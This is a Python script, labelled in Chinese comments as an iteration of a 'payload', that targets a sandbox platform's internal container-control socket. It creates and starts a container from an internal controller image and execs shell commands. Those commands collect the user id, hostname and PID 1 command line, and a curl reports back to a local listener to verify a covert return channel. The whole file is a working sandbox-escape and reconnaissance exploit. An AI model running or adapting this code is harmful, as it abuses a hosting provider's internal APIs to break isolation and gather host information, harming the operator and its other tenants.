# -*- coding: utf-8 -*-
"""v113 payload: ProcessService 全链路 + 反向通道验证
P1 Create->Start->Exec(shell) -> processId
P2 ProcessService StreamOutput/Wait/Kill
P3 反向通道: payload 监听 TCP, exec 进程 curl 回传
输出 /vercel/sandbox/v113c.out"""
import socket, struct, time, signal, json, os, threading

OUT = '/vercel/sandbox/v113c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(220)


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def connect_unix(sockpath, path, body=b'{}', t=2.0):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n'
               'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n\r\n'
               % (path, len(body))).encode() + body
        s.sendall(req)
        d = b''
        try:
            while True:
                c = s.recv(8192)
                if not c:
                    break
                d += c
        except Exception:
            pass
        s.close()
        status = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        hdr_end = d.find(b'\r\n\r\n')
        payload = d[hdr_end + 4:hdr_end + 4 + 500] if hdr_end > 0 else b''
        return status, payload
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''


CELL = '/run/cell/cell.sock'
CTRS = '/vercel.hive.cell.api.containers.v1.ContainersService'
PROC = '/vercel.hive.cell.api.processes.v1.ProcessService'
IMG = '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'

# 反向通道 listener
recv_data = []


def listener():
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(('127.0.0.1', 33333))
        srv.listen(5)
        srv.settimeout(20)
        while True:
            try:
                c, _ = srv.accept()
                c.settimeout(3)
                d = b''
                try:
                    while True:
                        x = c.recv(4096)
                        if not x:
                            break
                        d += x
                except Exception:
                    pass
                recv_data.append(d[:500])
                log('LISTENER got %dB: %r' % (len(d), d[:300]))
                c.close()
            except Exception:
                break
    except Exception as e:
        log('LISTENER EXC %s' % type(e).__name__)


th = threading.Thread(target=listener, daemon=True)
th.start()
time.sleep(0.3)

# P1 Create -> Start -> Exec
log('=== P1 create-start-exec ===')
st, pay = connect_unix(CELL, '%s/Create' % CTRS, json.dumps({'image': IMG}).encode(), t=10)
cid = None
try:
    cid = json.loads(pay.decode()).get('containerId')
except Exception:
    pass
log('cid=%s' % cid)
if not cid:
    f.close()
    raise SystemExit

st, pay = connect_unix(CELL, '%s/Start' % CTRS, json.dumps({'containerId': cid}).encode(), t=8)
log('START -> %s' % st)

# exec 命令: 收集信息 + 反向通道回传 + 保持进程存活
cmd = ("id; echo HOST=$(cat /etc/hostname); echo P1=$(head -c 80 /proc/1/cmdline); "
       "curl -s --max-time 3 http://127.0.0.1:33333/ok_$(id -u)_$(hostname) 2>/dev/null; sleep 8")
st, pay = connect_unix(CELL, '%s/Exec' % CTRS,
                       json.dumps({'containerId': cid, 'process': {'args': ['/bin/sh', '-c', cmd]}}).encode(), t=5)
log('EXEC -> %s %r' % (st, pay[:200]))
pid = None
try:
    pid = json.loads(pay.decode()).get('processId')
except Exception:
    pass
log('processId=%s' % pid)

# P2 ProcessService
log('=== P2 process service ===')
if pid:
    for m in ('StreamOutput', 'Wait', 'Kill'):
        body = json.dumps({'processId': pid})
        st, pay = connect_unix(CELL, '%s/%s' % (PROC, m), body.encode(), t=5)
        log('PS %s -> %s %r' % (m, st, pay[:300]))

# P3 等 listener 数据
log('=== P3 reverse channel ===')
time.sleep(10)
log('listener got %d connections: %r' % (len(recv_data), recv_data))

# 清理
st, pay = connect_unix(CELL, '%s/Kill' % CTRS, json.dumps({'containerId': cid}).encode(), t=3)
log('KILL -> %s %r' % (st, pay[:100]))

log('V113C_DONE')
f.close()
